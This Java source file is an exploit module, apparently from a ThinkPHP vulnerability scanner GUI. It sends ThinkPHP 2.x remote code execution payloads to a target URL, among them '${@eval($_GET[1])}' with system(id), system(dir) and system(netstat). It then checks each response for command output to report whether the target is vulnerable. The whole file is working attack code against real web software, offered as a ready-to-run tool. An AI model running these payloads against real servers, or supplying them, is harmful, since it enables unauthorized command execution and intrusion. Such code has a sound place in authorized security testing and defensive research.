package exploit;

import com.example.thinkphpgui.ConfigManager;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import com.example.thinkphpgui.Exploit;
import com.example.thinkphpgui.utils.HttpRequestUtil;


public class Tp2_Rce implements Exploit {
    private final ConfigManager configManager = ConfigManager.getInstance();
    private final List<String> payloadList = new ArrayList<>(Arrays.asList(
            "?s=/index/index/name/$%7B@phpinfo()%7D",
            "?s=/a/b/c/${@phpinfo()}",
            "?s=/a/b/c/${@eval($_GET[1])}&1=system(id);",
            "?s=/a/b/c/${@eval($_GET[1])}&1=system(dir);",
            "?s=/a/b/c/${@eval($_GET[1])}&1=system(netstat);"
    ));

    private static final List<String> verifyStringList = Arrays.asList(
            "PHP Core", "PHP Variables", "PHP License", "uid=", "groups=",
            "gid=", "x86_64", "i686", "i386", "ESTABLISHED", "CLOSE_WAIT",
            "LAST_ACK", "TIME_WAIT", "GNU/Linux", "<DIR>"
    );


    public void verify(String url) {
        boolean isVulnerable=false;

        for (String payload : payloadList) {
            try {
                HttpURLConnection httpURLConnection=HttpRequestUtil.get(url + payload);
                System.out.println(url + payload);

                BufferedReader bufferedReader;
                if (httpURLConnection.getResponseCode() >= 400) {
                    bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
                } else {
                    bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                }
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    if(verifyStringList.stream().anyMatch(line::contains)) {
                        configManager.appendToTextArea("[+] " + url + "   存在 Thinkphp 2 RCE   " + url  + payload);
                        isVulnerable=true;
                        break;
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        if(!isVulnerable){
            configManager.appendToTextArea("[-] " + url + "   不存在 Thinkphp 2 RCE");
        }
    }

    @Override
    public void startScan(String url) {
        verify(url);
    }

}
